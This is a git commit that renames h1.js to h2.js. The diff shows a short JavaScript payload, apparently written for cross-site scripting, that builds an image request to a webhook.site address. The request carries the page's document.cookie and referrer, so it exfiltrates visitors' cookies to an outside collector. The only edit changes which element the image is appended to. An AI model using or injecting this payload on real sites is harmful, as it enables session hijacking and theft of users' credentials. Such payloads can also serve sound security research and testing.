32f5fffeb976531c47f2b2874cc89a1c40f2138c
terjanq <terjanq@users.noreply.github.com>
2020-01-22 20:13:04 +0100

    Update and rename h1.js to h2.js

--- h2.js
+++ h2.js
@@ -1,3 +1,3 @@
 var x = document.createElement('img');
 x.src=`https://webhook.site/c8c5563a-33e6-4cd2-a4e5-146c5fcbe28b?${document.cookie}&ref=${document.referrer}`
-document.body.appendChild(x);
+document.documentElement.appendChild(x);
